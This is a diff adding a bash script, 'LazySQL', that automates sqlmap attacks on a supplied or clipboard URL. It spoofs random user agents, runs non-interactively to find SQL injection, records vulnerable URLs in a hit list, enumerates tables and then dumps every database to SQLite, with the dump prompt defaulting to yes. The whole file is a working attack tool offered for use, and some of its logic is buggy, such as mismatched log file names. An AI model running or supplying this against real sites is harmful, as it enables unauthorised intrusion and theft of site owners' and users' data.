@@ -1,0 +1,120 @@
+#!/bin/bash 
+#Automated Sqlmap#
+
+
+echo "  _                    ____   ___  _     ";
+echo " | |    __ _ _____   _/ ___| / _ \| |    ";
+echo " | |   / _\` |_  / | | \___ \| | | | |    ";
+echo " | |__| (_| |/ /| |_| |___) | |_| | |___ ";
+echo " |_____\__,_/___|\__, |____/ \__\_\_____|";
+echo "                 |___/                   ";
+echo
+echo
+tput bold;
+echo "LazySQL script is used for fast sqlmap scanning and dumping."
+echo "If no URL is specified, LazySQL uses the last clipboard entry."
+echo "If the number of threads is not specified, LazySQL uses "3" as standard value."
+echo 
+echo "Made for private use by Inbell1s."
+echo
+tput sgr0
+
+##Input##
+echo "URL:"
+read -r url
+	if [ -z "$url" ]; then
+		url=$(xclip -selection c -o)
+	fi
+
+while true; do
+	if echo $url | grep -q -v "http"; then
+		tput rmso;
+		tput smso;
+		echo "Url does not contain "http or https""
+		tput rmso;
+		echo -ne '\007'
+		echo
+		echo "Valid url:"
+		read -r url
+			if [ -z "$url" ]; then
+                		url=$(xclip -selection c -o)
+		        fi
+	else
+		echo
+		tput smso;
+		echo "Using url: $url"
+		tput rmso;
+		break
+	fi
+done
+
+echo
+echo "Threads:"
+read -r Threads
+	if [ -z "$Threads" ]; then
+		Threads=3
+		tput smso;  echo "Starting with 3 Threads. (Default)"; tput rmso
+	fi
+
+echo "Extra"
+read -r extra
+
+sqlmap --random-agent --batch --threads "$Threads" --dbs -u "$url" $extra | tee lsql.log 
+
+echo
+echo
+tput smso;
+echo "Used command:"
+tput rmso;
+echo "sqlmap --random-agent --batch --threads '"$Threads"' --dbs -u '"$url"' "$extra""
+echo
+echo "Link:"
+echo $url
+echo
+if  grep -q "back-end DBMS:" lsql.log; then
+now=$(date)
+	if grep -q "$url" ~/lsql.vul; then
+	tput smso;
+	echo "Previously added url!"
+	else
+	echo "Added to log!"
+	tput rmso;
+fi
+echo "$url - $now" >> ~/.lsql.vul
+echo "$url" >> ~/lsql.list
+tput smso;
+echo
+echo
+echo "Injection found, next command:"
+tput rmso;
+echo "sqlmap --random-agent -o --batch --no-cast --exclude-sysdb --tables -u '"$url"'"
+echo
+echo
+sqlmap --random-agent -o --batch --no-cast --exclude-sysdb --tables -u ""$url""
+else 
+echo
+tput smso;
+echo "No injection found."
+tput rmso;
+exit 0
+fi
+
+##Dump option##
+
+while true; do
+    read -p "Do you wish to dump the database?: (Y/n)" yn
+	case $yn in
+        [Y]* ) break;;
+        [n]* ) exit;;
+        * ) break;;
+    esac
+done
+echo
+tput smso;
+echo "Starting database dump!"
+tput rmso;
+sleep 3
+
+sqlmap --random-agent -o --batch --no-cast --exclude-sysdb --dump-all --dump-format sqlite -u ""$url""
+
+exit 0
